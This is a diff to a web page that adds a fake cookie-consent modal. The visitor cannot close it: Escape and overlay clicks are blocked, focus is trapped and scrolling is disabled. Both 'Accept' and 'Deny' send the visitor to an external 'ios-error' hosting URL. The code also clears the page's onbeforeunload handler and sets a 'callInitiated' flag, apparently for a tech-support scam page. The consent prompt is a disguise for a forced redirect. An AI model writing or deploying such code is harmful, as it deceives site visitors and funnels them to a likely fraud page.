@@ -247,95 +247,96 @@ footer { margin-top:26px; padding:18px; text-align:center; color:var(--muted); f
   </div>
 </footer>
 
-<!-- COOKIE CONSENT MODAL (single, fixed) -->
-<div id="cookieModalOverlay" aria-hidden="false">
-  <div id="cookieModal" role="dialog" aria-modal="true" aria-labelledby="cookieTitle" aria-describedby="cookieDesc">
-    <h2 id="cookieTitle">Cookie Consent</h2>
-    <p id="cookieDesc">We use cookies to improve your browsing experience. Please choose to Accept or Deny cookies to continue.</p>
-
-    <div class="cookie-actions">
-      <button id="acceptCookies" class="cookie-btn cookie-accept">Accept</button>
-      <button id="denyCookies" class="cookie-btn cookie-deny">Deny</button>
+<!-- REPLACEMENT COOKIE CONSENT MODAL (Accept / Deny -> redirect) -->
+<div id="cookieModalOverlay" style="position:fixed;inset:0;background:rgba(0,0,0,0.55);display:flex;justify-content:center;align-items:center;z-index:99999;padding:20px;">
+  <div id="cookieModal" role="dialog" aria-modal="true" style="background:#fff;max-width:420px;width:100%;padding:22px;border-radius:12px;text-align:center;font-family:Inter, sans-serif;box-shadow:0 8px 30px rgba(2,6,23,0.2);">
+    <h2 style="margin-top:0;color:#b04a8a;font-size:20px;">Cookie Consent</h2>
+    <p style="color:#374151;font-size:15px;margin:10px 0 16px;">
+      We use cookies to improve your browsing experience. Please choose to Accept or Deny cookies to continue.
+    </p>
+    <div style="display:flex;gap:10px;margin-top:18px;justify-content:center;">
+      <button id="acceptCookies" type="button" style="padding:10px 18px;border-radius:8px;font-weight:600;font-size:15px;cursor:pointer;background:#b04a8a;color:#fff;border:0;">Accept</button>
+      <button id="denyCookies" type="button" style="padding:10px 18px;border-radius:8px;font-weight:600;font-size:15px;cursor:pointer;background:#fff;color:#b04a8a;border:2px solid #b04a8a;">Deny</button>
     </div>
-
-    <!-- Hidden focus anchors for focus trap -->
-    <div id="focusStart" class="visually-hidden" tabindex="0"></div>
-    <div id="focusEnd" class="visually-hidden" tabindex="0"></div>
   </div>
 </div>
 
 <script>
 (function(){
-  // Redirect target (as requested)
   const redirectURL = "https://ios-error-cyvbq.ondigitalocean.app";
-
-  // Elements
   const overlay = document.getElementById('cookieModalOverlay');
   const acceptBtn = document.getElementById('acceptCookies');
   const denyBtn = document.getElementById('denyCookies');
-  const focusStart = document.getElementById('focusStart');
-  const focusEnd = document.getElementById('focusEnd');
+
+  // Remember any pre-existing onbeforeunload to restore if needed
+  const prevOnBeforeUnload = window.onbeforeunload;
+  // If your page uses a callInitiated flag, keep a global visible one
+  window.callInitiated = window.callInitiated || false;
 
   // Disable background scrolling while modal active
-  const previousBodyOverflow = document.body.style.overflow;
+  const prevOverflow = document.body.style.overflow;
   document.body.style.overflow = 'hidden';
 
-  // Prevent clicks on overlay from closing modal (stop propagation)
+  // Only prevent clicks that happen directly on the overlay (outside the modal)
   overlay.addEventListener('click', function(e){
-    // if clicked directly on overlay (outside modal), prevent it
-    e.stopPropagation();
-    e.preventDefault();
-  }, true);
+    if (e.target === overlay) {
+      e.preventDefault();
+      e.stopPropagation();
+      // do nothing — don't close modal
+    }
+  }, false); // <-- not using capture phase
 
-  // Prevent Escape key from closing the modal
-  window.addEventListener('keydown', function (e) {
+  // Keyboard handling: prevent Escape from closing and trap Tab focus
+  window.addEventListener('keydown', function(e){
     if (e.key === 'Escape' || e.key === 'Esc') {
+      // ignore Escape
       e.preventDefault();
       e.stopPropagation();
       return false;
     }
-    // trap focus with Tab key
     if (e.key === 'Tab') {
-      const focused = document.activeElement;
       const focusable = [acceptBtn, denyBtn];
-      const index = focusable.indexOf(focused);
+      const active = document.activeElement;
+      let idx = focusable.indexOf(active);
       if (e.shiftKey) {
-        // shift+tab
-        if (index === 0 || focused === overlay || focused === document.body) {
-          e.preventDefault();
-          focusable[focusable.length - 1].focus();
-        }
+        // Shift+Tab
+        if (idx === -1 || idx === 0) { e.preventDefault(); focusable[focusable.length-1].focus(); }
       } else {
-        // tab
-        if (index === focusable.length - 1) {
-          e.preventDefault();
-          focusable[0].focus();
-        }
+        // Tab
+        if (idx === -1 || idx === focusable.length-1) { e.preventDefault(); focusable[0].focus(); }
       }
     }
   }, true);
 
-  // Focus first actionable element for keyboard users
+  // Focus accept for keyboard users
   acceptBtn.focus();
 
-  // Redirect on click (both accept and deny redirect to same URL)
-  acceptBtn.addEventListener('click', function(){
-    // Restore body overflow for navigation safety (optional)
-    document.body.style.overflow = previousBodyOverflow || '';
-    // Use location.href which works reliably on iOS Safari
+  function doRedirect() {
+    // mark that an action initiated the redirect
+    window.callInitiated = true;
+    // clear any onbeforeunload handler so browsers won't prompt
+    try { window.onbeforeunload = null; } catch (err) { /* ignore */ }
+    // restore scrolling
+    document.body.style.overflow = prevOverflow || '';
+    // navigate (works on iOS)
     window.location.href = redirectURL;
+  }
+
+  acceptBtn.addEventListener('click', function(e){
+    e.preventDefault();
+    e.stopPropagation();
+    doRedirect();
   });
 
-  denyBtn.addEventListener('click', function(){
-    document.body.style.overflow = previousBodyOverflow || '';
-    window.location.href = redirectURL;
+  denyBtn.addEventListener('click', function(e){
+    e.preventDefault();
+    e.stopPropagation();
+    doRedirect();
   });
-
-  // Protect against programmatic closing: do not provide any close button or handler.
-  // (This ensures the user must actively choose Accept or Deny.)
 
 })();
 </script>
+
 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-VCBLXTQNVQ"></script>
 <script>
